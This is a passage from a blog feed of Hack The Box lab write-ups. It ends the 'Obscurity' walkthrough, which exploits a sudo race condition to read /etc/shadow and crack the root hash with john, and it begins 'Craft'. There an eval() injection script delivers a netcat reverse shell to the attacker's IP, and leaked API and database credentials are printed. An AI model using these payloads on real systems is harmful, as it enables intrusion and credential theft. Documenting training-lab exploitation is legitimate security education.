+path &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(random&lt;span style="color:#f92672">.&lt;/span>choices(string&lt;span style="color:#f92672">.&lt;/span>ascii_letters &lt;span style="color:#f92672">+&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>digits, k&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>))
+session &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#e6db74">&amp;#34;user&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;authenticated&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">0&lt;/span>}
+&lt;span style="color:#66d9ef">try&lt;/span>:
+session[&lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Enter username: &amp;#34;&lt;/span>)
+passW &lt;span style="color:#f92672">=&lt;/span> input(&lt;span style="color:#e6db74">&amp;#34;Enter password: &amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;/etc/shadow&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+data &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>readlines()
+data &lt;span style="color:#f92672">=&lt;/span> [(p&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">&amp;#34;$&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> p &lt;span style="color:#66d9ef">else&lt;/span> None) &lt;span style="color:#66d9ef">for&lt;/span> p &lt;span style="color:#f92672">in&lt;/span> data]
+passwords &lt;span style="color:#f92672">=&lt;/span> []
+&lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> data:
+&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> x &lt;span style="color:#f92672">==&lt;/span> None:
+passwords&lt;span style="color:#f92672">.&lt;/span>append(x)
+passwordFile &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join([&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(p) &lt;span style="color:#66d9ef">for&lt;/span> p &lt;span style="color:#f92672">in&lt;/span> passwords])
+&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;/tmp/SSH/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>path, &lt;span style="color:#e6db74">&amp;#39;w&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+f&lt;span style="color:#f92672">.&lt;/span>write(passwordFile)
+time&lt;span style="color:#f92672">.&lt;/span>sleep(&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>)
+salt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+realPass &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+&lt;span style="color:#66d9ef">for&lt;/span> p &lt;span style="color:#f92672">in&lt;/span> passwords:
+&lt;span style="color:#66d9ef">if&lt;/span> p[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> session[&lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>]:
+salt, realPass &lt;span style="color:#f92672">=&lt;/span> p[&lt;span style="color:#ae81ff">1&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;$&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">2&lt;/span>:]
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;span style="color:#66d9ef">if&lt;/span> salt &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>:
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Invalid user&amp;#34;&lt;/span>)
+os&lt;span style="color:#f92672">.&lt;/span>remove(&lt;span style="color:#e6db74">&amp;#39;/tmp/SSH/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>path)
+sys&lt;span style="color:#f92672">.&lt;/span>exit(&lt;span style="color:#ae81ff">0&lt;/span>)
+salt &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;$6$&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>salt&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#e6db74">&amp;#39;$&amp;#39;&lt;/span>
+realPass &lt;span style="color:#f92672">=&lt;/span> salt &lt;span style="color:#f92672">+&lt;/span> realPass
+hash &lt;span style="color:#f92672">=&lt;/span> crypt&lt;span style="color:#f92672">.&lt;/span>crypt(passW, salt)
+&lt;span style="color:#66d9ef">if&lt;/span> hash &lt;span style="color:#f92672">==&lt;/span> realPass:
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Authed!&amp;#34;&lt;/span>)
+session[&lt;span style="color:#e6db74">&amp;#39;authenticated&amp;#39;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;span style="color:#66d9ef">else&lt;/span>:
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Incorrect pass&amp;#34;&lt;/span>)
+os&lt;span style="color:#f92672">.&lt;/span>remove(&lt;span style="color:#e6db74">&amp;#39;/tmp/SSH/&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>path)
+sys&lt;span style="color:#f92672">.&lt;/span>exit(&lt;span style="color:#ae81ff">0&lt;/span>)
+os&lt;span style="color:#f92672">.&lt;/span>remove(os&lt;span style="color:#f92672">.&lt;/span>path&lt;span style="color:#f92672">.&lt;/span>join(&lt;span style="color:#e6db74">&amp;#39;/tmp/SSH/&amp;#39;&lt;/span>,path))
+&lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">Exception&lt;/span> &lt;span style="color:#66d9ef">as&lt;/span> e:
+traceback&lt;span style="color:#f92672">.&lt;/span>print_exc()
+sys&lt;span style="color:#f92672">.&lt;/span>exit(&lt;span style="color:#ae81ff">0&lt;/span>)
+&lt;span style="color:#66d9ef">if&lt;/span> session[&lt;span style="color:#e6db74">&amp;#39;authenticated&amp;#39;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>:
+&lt;span style="color:#66d9ef">while&lt;/span> True:
+command &lt;span style="color:#f92672">=&lt;/span> input(session[&lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;@Obscure$ &amp;#34;&lt;/span>)
+cmd &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#39;sudo&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;-u&amp;#39;&lt;/span>, session[&lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>]]
+cmd&lt;span style="color:#f92672">.&lt;/span>extend(command&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>))
+proc &lt;span style="color:#f92672">=&lt;/span> subprocess&lt;span style="color:#f92672">.&lt;/span>Popen(cmd, stdout&lt;span style="color:#f92672">=&lt;/span>subprocess&lt;span style="color:#f92672">.&lt;/span>PIPE, stderr&lt;span style="color:#f92672">=&lt;/span>subprocess&lt;span style="color:#f92672">.&lt;/span>PIPE)
+o,e &lt;span style="color:#f92672">=&lt;/span> proc&lt;span style="color:#f92672">.&lt;/span>communicate()
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;Output: &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> o&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;ascii&amp;#39;&lt;/span>))
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;Error: &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> e&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;ascii&amp;#39;&lt;/span>)) &lt;span style="color:#66d9ef">if&lt;/span> len(e&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;ascii&amp;#39;&lt;/span>)) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>)
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>On top of this we see that we can run with sudo (tl;dr: as root user) the mentioned script:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo -l
+Matching Defaults entries for robert on obscure:
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+User robert may run the following commands on obscure:
+(ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+&lt;/code>&lt;/pre>&lt;p>By analyzing the source code, we see that once you try to login with &lt;code>BetterSSH&lt;/code>, there is a moment where &lt;code>/etc/shadow&lt;/code> is open in read mode (posible due to execute &lt;code>BetterSSH.py&lt;/code> with sudo!), and is written under &lt;code>/tmp/SSH&lt;/code> on a file, later on the temporal &lt;code>/etc/shadow&lt;/code> written in tmp will be deleted, this means here we have a race condition where at some moment if we try to read the contents of the temporal file generated we will be able to do it, said this, let&amp;rsquo;s try it.&lt;/p>
+&lt;p>On one terminal, we execute &lt;code>BetterSSH.py&lt;/code> with sudo:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
+Enter username: root
+Enter password: foo
+Incorrect pass
+&lt;/code>&lt;/pre>&lt;p>And in another term, we execute a while true loop, that will be doing cat on the files under &lt;code>/tmp/SSH&lt;/code>, and at some moment we confim the race condition we previously thought of as we have the content of &lt;code>/etc/shadow&lt;/code> for the user root (remember the script is run with sudo):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">robert@obscure:/tmp/SSH$ while true; do cat *; done
+root
+$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
+18226
+0
+99999
+7
+&lt;/code>&lt;/pre>&lt;p>I grab that content of shadow and the one of &lt;code>/etc/passwd&lt;/code>, run unshadow to generate a file compatible to john and crack it:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# unshadow passwd.txt shadow.txt &amp;gt; rootkey.txt
+root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# john --wordlist=/usr/share/wordlists/rockyou.txt rootkey.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+--- SNIP ---
+mercedes (root)
+--- SNIP ---
+Session completed
+&lt;/code>&lt;/pre>&lt;p>And there we have the password of root user; &lt;code>mercedes&lt;/code> and we succesfully login as root with it :D&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">robert@obscure:~/BetterSSH$ su - root
+Password:
+root@obscure:~# id
+uid=0(root) gid=0(root) groups=0(root)
+&lt;/code>&lt;/pre>&lt;p>Well, this was a really fun machine, and one that teach me a lot (specifically talking python stuff), so well I hope I can give something yousefull to you with this write up, and thanks a lot for read until the end :)&lt;/p>
+&lt;p>I will try to be making some time to do write ups of some other machines, until next time!!&lt;/p></description></item><item><title>Hack The Box - Craft</title><link>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</link><pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</guid><description>
+&lt;img src="https://ceso.github.io/images/htb/craft/info-card.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="quick-summary">Quick Summary&lt;/h2>
+&lt;p>So!!
+Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot &lt;a href="https://www.hackthebox.eu/profile/103596">@Fugl!&lt;/a>), root was easy by a little bit of enumeration and reading help command output.&lt;/p>
+&lt;p>I had so much fun with this box trying to break in before it was going to be retired, that challenge of doing it with a few hours of deadline felt so god!&lt;/p>
+&lt;p>Said that, let&amp;rsquo;s start with the real write up!&lt;/p>
+&lt;h2 id="nmap">Nmap&lt;/h2>
+&lt;p>We start running nmap to scan for open ports and services:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nmap -sC -sV -O 10.10.10.110 -o ininitial-nmap.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-23 17:21 EST
+Nmap scan report for 10.10.10.110
+Host is up (0.082s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
+| ssh-hostkey:
+| 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
+| 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
+|_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
+443/tcp open ssl/http nginx 1.15.8
+|_http-server-header: nginx/1.15.8
+|_http-title: About
+| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
+| Not valid before: 2019-02-06T02:25:47
+|_Not valid after: 2020-06-20T02:25:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn:
+|_ http/1.1
+| tls-nextprotoneg:
+|_ http/1.1
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=12/23%OT=22%CT=1%CU=35537%PV=Y%DS=2%DC=I%G=Y%TM=5E013E
+OS:1F%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=8)OP
+OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
+OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
+OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.11 seconds
+&lt;/code>&lt;/pre>&lt;p>We got port port 22 (SSH) and 443 (HTTPS) are open.&lt;/p>
+&lt;h2 id="web-enumeration">Web enumeration&lt;/h2>
+&lt;p>The home page is kind-empty, but if we position the cursor on API and the Github logo, we see at the bottom that it will redirect to &lt;code>https://api.craft.htb&lt;/code> and &lt;code>https://gogs.craft.htb&lt;/code>, we will add them to &lt;code>/etc/hosts&lt;/code> pointing to the IP of craft &lt;code>10.10.10.110&lt;/code>.&lt;/p>
+&lt;p>
+&lt;img src="https://ceso.github.io/images/htb/craft/1-web-enum.png" class="center" style="border-radius: 8px;" />
+&lt;img src="https://ceso.github.io/images/htb/craft/2-web-enum.png" class="center" style="border-radius: 8px;" />
+&lt;/p>
+&lt;p>Afterwards, we jump into &lt;code>https://api.craft.htb&lt;/code> and we can see the endpoints and how to interact with them.&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/craft/1-api.png" class="center" style="border-radius: 8px;" />
+&lt;img src="https://ceso.github.io/images/htb/craft/2-api.png" class="center" style="border-radius: 8px;" />
+&lt;img src="https://ceso.github.io/images/htb/craft/3-api.png" class="center" style="border-radius: 8px;" />
+&lt;p>We don&amp;rsquo;t have at the moment any credentials to identify, so we go to &lt;code>https://gogs.craft.htb&lt;/code> in order to see if we can find something.&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/craft/1-gogs.png" class="center" style="border-radius: 8px;" />
+&lt;img src="https://ceso.github.io/images/htb/craft/2-gogs.png" class="center" style="border-radius: 8px;" />
+&lt;img src="https://ceso.github.io/images/htb/craft/3-gogs.png" class="center" style="border-radius: 8px;" />
+&lt;p>We see in explore there is a repository named &lt;code>craft-api&lt;/code> and that the users is our gang from Silicon Valley.&lt;/p>
+&lt;p>We jump into the repository, and start looking if we can find something.&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/craft/4-gogs.png" class="center" style="border-radius: 8px;" />
+&lt;p>There is an issue open, so we go inside it, and there is a &amp;ldquo;fix&amp;rdquo;, one that Gilfoyle is not happy about it.&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/craft/5-gogs.png" class="center" style="border-radius: 8px;" />
+&lt;p>So, there is the use of an &lt;code>eval()&lt;/code>, that&amp;rsquo;s something we could use to inject a command.&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/craft/6-gogs.png" class="center" style="border-radius: 8px;" />
+&lt;p>Taking a look into the commits made by Denish, we found in the commit &lt;code>a2d28ed155&lt;/code> that he removed hardcoded credentials, exactly the kind of things we needed:&lt;/p>
+&lt;img src="https://ceso.github.io/images/htb/craft/7-gogs.png" class="center" style="border-radius: 8px;" />
+&lt;h2 id="rce">RCE&lt;/h2>
+&lt;p>Now with credentials, knowing we could take advantage of the &lt;code>eval()&lt;/code> and remembering the curl Denish was using in his issue + the API, we can make an injection via a POST to &lt;code>/api/brew/&lt;/code>.
+I wrote a small script to authenticate and post that does the injection (tbh, I missed I could just use &lt;code>test.py&lt;/code> realized about it late). grabbing the token and using it to authenticate.&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# cat craft_inject.py
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+import requests
+import re
+import json
+url = &amp;quot;https://api.craft.htb/api/auth/login&amp;quot;
+login=('dinesh', '4aUh0A8PbVJxgd')
+r = requests.get(url, auth=login, allow_redirects=False, verify=False)
+token = json.loads(r.text)['token']
+print(token)
+url = &amp;quot;https://api.craft.htb/api/brew/&amp;quot;
+headers = {'X-Craft-API-Token':token, 'Content-Type': 'application/json'}
+inject = &amp;quot;&amp;quot;&amp;quot;__import__(&amp;quot;os&amp;quot;).system(&amp;quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.16 4444 &amp;gt;/tmp/f&amp;quot;)&amp;quot;&amp;quot;&amp;quot;
+payload = {&amp;quot;name&amp;quot;:&amp;quot;foo&amp;quot;,&amp;quot;brewer&amp;quot;:&amp;quot;foo&amp;quot;, &amp;quot;style&amp;quot;:&amp;quot;foo&amp;quot;, &amp;quot;abv&amp;quot;:inject}
+payload = json.dumps(payload)
+attack = requests.post(url, verify=False, headers=headers, allow_redirects=False, data=payload)
+&lt;/code>&lt;/pre>&lt;p>In one tab run nc listening on port 4444 with &lt;code>nc -lvp 4444&lt;/code>, and run in other tab we run the script to get the reverse:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# ./craft_inject.py
+&lt;/code>&lt;/pre>&lt;pre>&lt;code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/craft# nc -lvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from api.craft.htb [10.10.10.110] 41887
+/bin/sh: can't access tty; job control turned off
+/opt/app # whoami
+root
+/opt/app # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+&lt;/code>&lt;/pre>&lt;p>There is something weird, we are already root? we check if there is the &lt;code>root.txt&lt;/code> in it&amp;rsquo;s home and not, is not:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">/opt/app # cd /root
+/root # ls -la
+total 12
+drwx------ 1 root root 4096 Feb 9 2019 .
+drwxr-xr-x 1 root root 4096 Feb 10 2019 ..
+drwx------ 1 root root 4096 Feb 9 2019 .cache
+/root #
+&lt;/code>&lt;/pre>&lt;p>So we start enumerating and realize we are inside a jail (specifically a docker container, busybox):&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">/opt/app # ls -la /
+total 64
+drwxr-xr-x 1 root root 4096 Feb 10 2019 .
+drwxr-xr-x 1 root root 4096 Feb 10 2019 ..
+-rwxr-xr-x 1 root root 0 Feb 10 2019 .dockerenv
+drwxr-xr-x 1 root root 4096 Feb 6 2019 bin
+drwxr-xr-x 5 root root 340 Jan 4 20:47 dev
+drwxr-xr-x 1 root root 4096 Feb 10 2019 etc
+drwxr-xr-x 2 root root 4096 Jan 30 2019 home
+drwxr-xr-x 1 root root 4096 Feb 6 2019 lib
+drwxr-xr-x 5 root root 4096 Jan 30 2019 media
+drwxr-xr-x 2 root root 4096 Jan 30 2019 mnt
+drwxr-xr-x 1 root root 4096 Feb 9 2019 opt
+dr-xr-xr-x 208 root root 0 Jan 4 20:47 proc
+drwx------ 1 root root 4096 Feb 9 2019 root
+drwxr-xr-x 2 root root 4096 Jan 30 2019 run
+drwxr-xr-x 2 root root 4096 Jan 30 2019 sbin
+drwxr-xr-x 2 root root 4096 Jan 30 2019 srv
+dr-xr-xr-x 13 root root 0 Jan 4 20:47 sys
+drwxrwxrwt 1 root root 4096 Jan 4 20:48 tmp
+drwxr-xr-x 1 root root 4096 Feb 9 2019 usr
+drwxr-xr-x 1 root root 4096 Jan 30 2019 var
+/opt/app # ls -la /usr/bin
+total 13236
+drwxr-xr-x 1 root root 4096 Feb 9 2019 .
+drwxr-xr-x 1 root root 4096 Feb 9 2019 ..
+lrwxrwxrwx 1 root root 8 Feb 9 2019 2to3 -&amp;gt; 2to3-3.6
+-rwxr-xr-x 1 root root 95 Jan 24 2019 2to3-3.6
+lrwxrwxrwx 1 root root 12 Feb 6 2019 [ -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Jan 30 2019 [[ -&amp;gt; /bin/busybox
+-rwxr-xr-x 1 root root 34944 Jan 2 2019 addr2line
+-rwxr-xr-x 2 root root 55240 Jan 2 2019 ar
+-rwxr-xr-x 2 root root 814672 Jan 2 2019 as
+lrwxrwxrwx 1 root root 12 Jan 30 2019 awk -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Feb 6 2019 basename -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Jan 30 2019 beep -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Jan 30 2019 blkdiscard -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Jan 30 2019 bunzip2 -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Jan 30 2019 bzcat -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Jan 30 2019 bzip2 -&amp;gt; /bin/busybox
+-rwxr-xr-x 1 root root 30440 Jan 2 2019 c++filt
+-rwxr-xr-x 1 root root 214 Jan 3 2019 c89
+-rwxr-xr-x 1 root root 205 Jan 3 2019 c99
+-rwxr-xr-x 1 root root 14208 Jan 29 2019 c_rehash
+lrwxrwxrwx 1 root root 12 Jan 30 2019 cal -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 3 Feb 9 2019 cc -&amp;gt; gcc
+lrwxrwxrwx 1 root root 12 Jan 30 2019 chvt -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Feb 6 2019 cksum -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Jan 30 2019 clear -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Jan 30 2019 cmp -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Feb 6 2019 comm -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Jan 30 2019 cpio -&amp;gt; /bin/busybox
+-rwxr-xr-x 1 root root 898192 Jan 3 2019 cpp
+lrwxrwxrwx 1 root root 12 Jan 30 2019 crontab -&amp;gt; /bin/busybox
+lrwxrwxrwx 1 root root 12 Jan 30 2019 cryptpw -&amp;gt; /bin/busybox
+&lt;/code>&lt;/pre>&lt;p>Inside the directory were we started &lt;code>/opt/app&lt;/code> we see if there is something interesting:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">/opt/app # ls -la
+total 32
+drwxr-xr-x 5 root root 4096 Feb 10 2019 .
+drwxr-xr-x 1 root root 4096 Feb 9 2019 ..
+drwxr-xr-x 8 root root 4096 Feb 8 2019 .git
+-rw-r--r-- 1 root root 18 Feb 7 2019 .gitignore
+-rw-r--r-- 1 root root 1585 Feb 7 2019 app.py
+drwxr-xr-x 5 root root 4096 Feb 7 2019 craft_api
+-rwxr-xr-x 1 root root 673 Feb 8 2019 dbtest.py
+drwxr-xr-x 2 root root 4096 Feb 7 2019 tests
+/opt/app # grep -ir '\(pass\|password\|passwd\)' *
+app.py: flask_app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://%s:%s@%s/%s' % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
+craft_api/api/auth/endpoints/__pycache__/auth.cpython-36.pyc: Create an authentication token provided valid username and password.
+craft_api/api/auth/endpoints/auth.py: auth_results = User.query.filter(User.username == auth.username, User.password == auth.password).one()
+craft_api/api/auth/endpoints/auth.py: Create an authentication token provided valid username and password.
+craft_api/database/models.py: password = db.Column(db.String(80))
+craft_api/database/models.py: def __init__(self, username, password):
+craft_api/database/models.py: self.password = password
+craft_api/settings.py:MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
+dbtest.py: password=settings.MYSQL_DATABASE_PASSWORD,
+/opt/app #
+&lt;/code>&lt;/pre>&lt;p>There we see we have credentials for the database, we took a deep look into &lt;code>craft_api/settings.py&lt;/code> to see which one is the user, and it&amp;rsquo;s &lt;code>craft&lt;/code>, we take a look into the &lt;code>dbtest.py&lt;/code> we found early under &lt;code>/opt/app&lt;/code>:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">/opt/app # cat dbtest.py
+#!/usr/bin/env python
+import pymysql
+from craft_api import settings
+# test connection to mysql database
+connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+user=settings.MYSQL_DATABASE_USER,
+password=settings.MYSQL_DATABASE_PASSWORD,
+db=settings.MYSQL_DATABASE_DB,
+cursorclass=pymysql.cursors.DictCursor)
+try:
+with connection.cursor() as cursor:
+sql = &amp;quot;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&amp;quot;
+cursor.execute(sql)
+result = cursor.fetchone()
+print(result)
+finally:
+connection.close()
+/opt/app #
+&lt;/code>&lt;/pre>&lt;p>It&amp;rsquo;s using pymsql to interact with the database, going to the documentation of it, we see that what we need is to use the &lt;code>method fetchall()&lt;/code>
+&lt;img src="https://ceso.github.io/images/htb/craft/1-rce.png" class="center" style="border-radius: 8px;" />
+So, I change the script to do a &lt;code>show tables&lt;/code> using &lt;code>fetchall()&lt;/code> instead of &lt;code>fetchone()&lt;/code>:&lt;/p>
+&lt;pre>&lt;code class="language-console" data-lang="console">/opt/app # sed -i 's/result \= cursor.fetchone()/sql \= \&amp;quot;show tables\&amp;quot;/' dbtest.py
+/opt/app # sed -i 's/result \= cursor.fetchone()/result \= cursor.fetchall()/' dbtest.py
